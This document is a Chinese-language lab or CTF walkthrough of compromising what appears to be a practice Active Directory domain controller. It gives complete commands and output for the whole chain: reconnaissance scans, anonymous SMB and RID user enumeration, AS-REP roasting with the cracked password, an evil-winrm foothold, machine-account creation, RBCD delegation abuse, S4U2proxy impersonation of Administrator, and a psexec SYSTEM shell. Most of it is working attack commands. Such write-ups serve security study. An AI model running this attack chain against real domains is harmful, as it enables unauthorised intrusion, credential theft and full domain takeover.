# **一、信息收集**

## **1.1 主机发现**

首先，在当前内网环境中进行主机发现，以确定潜在的攻击目标。我们使用 `arp-scan` 对本地 `eth0` 网卡所在的 `192.168.205.0/24` 网段进行扫描，寻找存活主机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l      
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.132 00:0c:29:19:38:d9       VMware, Inc.
192.168.205.254 00:50:56:e9:e4:2e       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.005 seconds (127.68 hosts/sec). 4 responded
```

扫描结果显示，IP地址为 `192.168.205.132` 的主机处于活动状态，我们将其确定为本次渗透测试的目标。

## **1.2 端口与服务扫描**

为全面了解目标主机开放的服务和潜在的攻击面，我们使用 `nmap` 结合一个自定义脚本 `windowport.sh` 来进行深入的端口和服务扫描。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cat windowport.sh 
#!/bin/bash

nmap -p0-65535 $1 -oA nmapscan/ports
ports=$(grep open nmapscan/ports.nmap | awk -F '/' '{print $1}' | paste -sd ',')
nmap -p$ports -sC -sV -T4 $1 -oA nmapscan/xiports
nmap --script=vuln -p$ports $1 -oA nmapscan/vuln
```

执行该脚本对目标 `192.168.205.132` 进行扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ bash windowport.sh 192.168.205.132
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-22 22:37 EDT
Nmap scan report for 192.168.205.132
Host is up (0.00073s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
62319/tcp open  unknown
62320/tcp open  unknown
62333/tcp open  unknown
62352/tcp open  unknown
MAC Address: 00:0C:29:19:38:D9 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 104.79 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-22 22:39 EDT
Nmap scan report for 192.168.205.132
Host is up (0.00027s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-23 02:39:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: novice.com0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: novice.com0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
62319/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
62320/tcp open  msrpc         Microsoft Windows RPC
62333/tcp open  msrpc         Microsoft Windows RPC
62352/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 00:0C:29:19:38:D9 (VMware)
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DC, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:19:38:d9 (VMware)
|_clock-skew: -1s
| smb2-time: 
|   date: 2025-08-23T02:40:05
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.32 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-22 22:40 EDT
Nmap scan report for 192.168.205.132
Host is up (0.00050s latency).

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
62319/tcp open  unknown
62320/tcp open  unknown
62333/tcp open  unknown
62352/tcp open  unknown
MAC Address: 00:0C:29:19:38:D9 (VMware)

Host script results:
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 123.45 seconds
```

**扫描结果分析：**

*   **服务识别**：开放了 Kerberos(88)、LDAP(389)、SMB(445)、WinRM(5985) 等多个关键端口。
*   **系统角色**：服务信息明确指出这是一台 `Microsoft Windows Active Directory LDAP` 服务器，结合其主机名 `DC` 和域名 `novice.com`，可以确定其为域控制器。
*   **攻击向量**：基于开放的服务，初步的攻击思路将围绕活动目录认证协议（Kerberos, LDAP）和文件共享服务（SMB）展开。

---

# **二、漏洞利用与初始立足点**

## **2.1 SMB匿名枚举**

从 SMB 服务入手，使用 `smbclient` 尝试对目标进行匿名访问，列出其共享文件夹。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ smbclient -L //192.168.205.132/ -N       

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      远程管理
        C$              Disk      默认共享
        IPC$            IPC       远程 IPC
        NETLOGON        Disk      Logon server share 
        nothinghere     Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.205.132 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

成功列出了多个共享，其中 `nothinghere` 看起来比较可疑。我们尝试匿名连接到这个共享并查看其内容。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ smbclient //192.168.205.132/nothinghere -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Aug 18 08:03:56 2025
  ..                                DHS        0  Mon Aug 18 08:05:08 2025
  readme.txt                          A      135  Mon Aug 18 07:57:00 2025

                12923135 blocks of size 4096. 9365851 blocks available
smb: \> get readme.txt 
getting file \readme.txt of size 135 as readme.txt (13.2 KiloBytes/sec) (average 13.2 KiloBytes/sec)
smb: \> exit

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat readme.txt   
It’s not about this directory — the key point is your anonymous permissions. Think about what you can do with SMB anonymous access.
```

`readme.txt` 文件的内容给出了明确的提示：关键在于利用 SMB 的匿名访问权限进行下一步操作。

## **2.2 域内用户枚举**

利用已知的 SMB 匿名登录权限（空会话），可以使用 `impacket` 工具集中的 `lookupsid.py` 脚本，通过暴力猜解 RID (Relative ID) 的方式来枚举域内的用户和组。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@192.168.205.132
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at 192.168.205.132
[*] StringBinding ncacn_np:192.168.205.132[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-3649830887-1815587496-1699028491
498: NOVICE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: NOVICE\Administrator (SidTypeUser)
501: NOVICE\Guest (SidTypeUser)
502: NOVICE\krbtgt (SidTypeUser)
512: NOVICE\Domain Admins (SidTypeGroup)
513: NOVICE\Domain Users (SidTypeGroup)
514: NOVICE\Domain Guests (SidTypeGroup)
515: NOVICE\Domain Computers (SidTypeGroup)
516: NOVICE\Domain Controllers (SidTypeGroup)
517: NOVICE\Cert Publishers (SidTypeAlias)
518: NOVICE\Schema Admins (SidTypeGroup)
519: NOVICE\Enterprise Admins (SidTypeGroup)
520: NOVICE\Group Policy Creator Owners (SidTypeGroup)
521: NOVICE\Read-only Domain Controllers (SidTypeGroup)
522: NOVICE\Cloneable Domain Controllers (SidTypeGroup)
525: NOVICE\Protected Users (SidTypeGroup)
526: NOVICE\Key Admins (SidTypeGroup)
527: NOVICE\Enterprise Key Admins (SidTypeGroup)
553: NOVICE\RAS and IAS Servers (SidTypeAlias)
571: NOVICE\Allowed RODC Password Replication Group (SidTypeAlias)
572: NOVICE\Denied RODC Password Replication Group (SidTypeAlias)
1000: NOVICE\DC$ (SidTypeUser)
1101: NOVICE\DnsAdmins (SidTypeAlias)
1102: NOVICE\DnsUpdateProxy (SidTypeGroup)
1104: NOVICE\MrRobot (SidTypeUser)
```

脚本成功枚举出了域 `NOVICE` 的 SID 以及多个用户和组，包括 `Administrator`、`krbtgt` 和一个名为 `MrRobot` 的普通用户。为了方便后续利用，我们将所有类型为 `SidTypeUser` 的用户名提取并保存到 `user` 文件中。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@192.168.205.132 2>/dev/null | grep "(SidTypeUser)" | cut -d '\' -f2 | cut -d ' ' -f1 > user
Password:
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cat user      
Administrator
Guest
krbtgt
DC$
MrRobot
```

## **2.3 AS-REP Roasting 攻击**

> **知识点**: AS-REP Roasting 是一种针对Kerberos认证的攻击。如果一个域用户的账户属性中设置了 “不需要Kerberos预身份验证” (`UF_DONT_REQUIRE_PREAUTH` is `True`)，那么任何攻击者都可以冒充该用户向KDC（密钥分发中心）请求认证票据（AS-REP）。KDC会直接返回一个用该用户密码哈希加密的TGT票据。攻击者可以截获这个票据并进行离线破解，从而获取用户明文密码。

我们利用上一步获得的用户列表，使用 `GetNPUsers.py` 脚本尝试进行 AS-REP Roasting 攻击。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py novice.com/ -usersfile user -format john -outputfile hash -no-pass -dc-ip 192.168.205.132
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC$ doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$MrRobot@NOVICE.COM:17037b58fa06936b306893c2184c444a$fdd9db20ebe37b4cd79a1847c9cb7b2cbee5fa22c21c180ad23bc22e4249b7d373d3cd31d083493258d493f0c6a2fd4e38847fff4d1b93c7d3803a754dc78e0649c7f678ff7c40a06faee8d5fbf461e4aa69769eaafaf1ddf24383126f5724027343ab0fd70dd8501a3bf9ef39b9e08c4112bab1180b2f316fd7bd3205feed3f8c0366120602d0226094881746adcda4609a5f303139c2845ee0817321575d2c9e648fff2d8f46a11f70c49e0f057bbe0ed7155a16819211dc0c20eee7c09b42c423e12df38d788b5975ed5fdf1b64b7572e4c041580475835258a4b5d474e89e3a2dbec797756d9
```

脚本的输出显示，用户 `MrRobot` 的账户存在此配置缺陷，并成功获取了其 AS-REP 哈希，已保存至 `hash` 文件中。

## **2.4 离线密码破解**

接下来，使用 `John the Ripper` 配合强大的 `rockyou.txt` 字典，对获取到的哈希进行离线暴力破解。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mrroboto12       ($krb5asrep$MrRobot@NOVICE.COM)     
1g 0:00:00:01 DONE (2025-08-22 22:50) 0.5813g/s 3110Kp/s 3110Kc/s 3110KC/s mrsbrown89..mrkonochi
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

密码被成功破解，用户 `MrRobot` 的明文密码为 `mrroboto12`。

## **2.5 远程登录获取立足点**

利用刚刚获取的凭据，通过 `evil-winrm` 登录目标主机的 WinRM 服务（5985端口），这将为我们提供一个交互式的 PowerShell Shell。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ evil-winrm -i 192.168.205.132 -u 'MrRobot' -p 'mrroboto12'    
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\MrRobot\Documents> whoami /all
```

成功登录，我们已经在目标系统上获得了一个初始的立足点（Foothold）。

---

# **三、权限提升**

## **3.1 权限分析**

为了规划下一步的提权路线，首先在远程Shell中执行 `whoami /all` 命令，查看当前用户 `MrRobot` 的详细权限信息。

```powershell
*Evil-WinRM* PS C:\Users\MrRobot\Documents> whoami /all

用户信息
----------------

用户名         SID
============== ==============================================
novice\mrrobot S-1-5-21-3649830887-1815587496-1699028491-1104


组信息
-----------------

组名                                        类型   SID          属性
=========================================== ====== ============ ==============================
Everyone                                    已知组 S-1-1-0      必需的组, 启用于默认, 启用的组
BUILTIN\Remote Management Users             别名   S-1-5-32-580 必需的组, 启用于默认, 启用的组
BUILTIN\Users                               别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组
BUILTIN\Pre-Windows 2000 Compatible Access  别名   S-1-5-32-554 必需的组, 启用于默认, 启用的组
NT AUTHORITY\NETWORK                        已知组 S-1-5-2      必需的组, 启用于默认, 启用的组
NT AUTHORITY\Authenticated Users            已知组 S-1-5-11     必需的组, 启用于默认, 启用的组
NT AUTHORITY\This Organization              已知组 S-1-5-15     必需的组, 启用于默认, 启用的组
NT AUTHORITY\NTLM Authentication            已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组
Mandatory Label\Medium Plus Mandatory Level 标签   S-1-16-8448


特权信息
----------------------

特权名                        描述             状态
============================= ================ ======
SeMachineAccountPrivilege     将工作站添加到域 已启用
SeChangeNotifyPrivilege       绕过遍历检查     已启用
SeIncreaseWorkingSetPrivilege 增加进程工作集   已启用


用户声明信息
-----------------------

用户声明未知。

已在此设备上禁用对动态访问控制的 Kerberos 支持。
```

输出结果中最引人注目的一点是，用户 `novice\mrrobot` 拥有 `SeMachineAccountPrivilege` 特权。

> **知识点**: `SeMachineAccountPrivilege` 特权允许持有者将计算机加入到域中。在默认的Active Directory配置下，普通域用户拥有此权限，并且最多可以将10个机器账户添加到域中。攻击者可以滥用此权限，创建一个由自己完全控制的机器账户，并以此为跳板进行后续的委派攻击，最终实现权限提升。

## **3.2 滥用机器账户配额**

我们利用 `SeMachineAccountPrivilege` 特权，使用 `addcomputer.py` 脚本以 `MrRobot` 的身份在域中添加一个名为 `NEWPC$` 的新机器账户，并为其设置一个我们已知的密码 `Password123!`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 /usr/share/doc/python3-impacket/examples/addcomputer.py -computer-name 'NEWPC$' -computer-pass 'Password123!' -dc-ip 192.168.205.132 novice.com/MrRobot:mrroboto12
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account NEWPC$ with password Password123!.
```

机器账户创建成功，我们现在拥有了一个域内的新身份。

## **3.3 配置基于资源的约束性委派 (RBCD)**

> **知识点**: 单纯创建一个机器账户并不能直接模拟管理员。我们需要配置域控制器，让它“信任”我们创建的 `NEWPC$` 账户可以代表其他用户（包括管理员）来请求服务。这个过程就是配置“基于资源的约束性委派”（RBCD）。我们通过修改域控主机对象（`DC$`）的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性，将我们控制的 `NEWPC$` 的SID添加进去，从而单向地建立信任关系。

利用 `MrRobot` 用户的权限，使用 `rbcd.py` 脚本来修改 `DC$` 的安全描述符，授予 `NEWPC$` 对 `DC$` 的委派权限。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 /usr/share/doc/python3-impacket/examples/rbcd.py -action write -delegate-to 'DC$' -delegate-from 'NEWPC$' -dc-ip 192.168.205.132 'novice.com/MrRobot:mrroboto12'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] NEWPC$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     NEWPC$       (S-1-5-21-3649830887-1815587496-1699028491-2601)
```

输出确认委派权限已成功修改，`NEWPC$` 现在可以模拟用户在 `DC$` 上进行操作了。

## **3.4 Kerberos委派攻击 (S4U2proxy)**

现在，攻击流程进入最后阶段。

1. **获取 `NEWPC$` 的 TGT**
   首先，使用 `getTGT.py` 和我们为 `NEWPC$` 设置的密码，获取其Kerberos TGT（票据授予票据）。

   ```bash
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ python3 /usr/share/doc/python3-impacket/examples/getTGT.py -dc-ip 192.168.205.132 novice.com/NEWPC$:Password123!
   Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
   
   [*] Saving ticket in NEWPC$.ccache
   ```

2. **请求模拟管理员的服务票据**
   接下来，利用上一步获取的 TGT，通过 Kerberos S4U2proxy 扩展协议，请求一张可以**模拟 `Administrator` 用户**身份、并用于访问域控 `cifs`（文件共享）服务的服务票据 (ST)。

   ```bash
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ export KRB5CCNAME=NEWPC$.ccache
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ python3 /usr/share/doc/python3-impacket/examples/getST.py -k -no-pass -spn cifs/dc.novice.com -impersonate Administrator -dc-ip 192.168.205.132 novice.com/NEWPC$       
   Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
   
   [*] Impersonating Administrator
   [*] Requesting S4U2self
   [*] Requesting S4U2Proxy
   [*] Saving ticket in Administrator@cifs_dc.novice.com@NOVICE.COM.ccache
   ```

   攻击成功，我们获取了包含管理员权限的服务票据，并保存在一个新的 `.ccache` 凭证缓存文件中。

---

# **四、夺取域控与总结**

## **4.1 解决名称解析问题**

在直接使用最终票据进行攻击时，我们的攻击机可能因为无法将域名 `dc.novice.com` 和 `novice.com` 解析到正确的IP地址而导致连接失败。为了避免这个问题，需要将域名和IP的对应关系手动写入本地的 `/etc/hosts` 文件。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo nano /etc/hosts
[sudo] kali 的密码：
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ tail -n 1 /etc/hosts                                  
192.168.205.132 novice.com dc.novice.com DC
```

添加此条目后，所有相关的域名都将正确指向目标IP。

## **4.2 最终攻击**

1. **加载最终票据**
   首先，更新 `KRB5CCNAME` 环境变量，使其指向刚刚获取的、包含管理员权限的新票据文件。

   ```bash
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ export KRB5CCNAME=Administrator@cifs_dc.novice.com@NOVICE.COM.ccache
   ```

2. **执行 `psexec.py` 获取SYSTEM权限**
   最后，使用 `psexec.py` 和已加载的管理员票据，在域控制器上执行命令。该工具将利用票据进行认证，并在目标上创建一个服务来反弹一个交互式Shell。

   ```bash
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ python3 /usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass dc.novice.com
   Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
   
   [*] Requesting shares on dc.novice.com.....
   [*] Found writable share ADMIN$
   [*] Uploading file ACAXTjTE.exe
   [*] Opening SVCManager on dc.novice.com.....
   [*] Creating service ELXu on dc.novice.com.....
   [*] Starting service ELXu.....
   [!] Press help for extra shell commands
   [-] Decoding error detected, consider running chcp.com at the target,
   map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
   and then execute smbexec.py again with -codec and the corresponding codec
   Microsoft Windows [�汾 10.0.20348.169]
   
   [-] Decoding error detected, consider running chcp.com at the target,
   map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
   and then execute smbexec.py again with -codec and the corresponding codec
   (c) Microsoft Corporation����������Ȩ����
   
   C:\Windows\system32> whoami
   nt authority\system
   ```

`whoami` 命令的返回结果确认为 `nt authority\system`，这表明我们已成功获得域控制器的最高系统权限。至此，本次渗透测试圆满完成。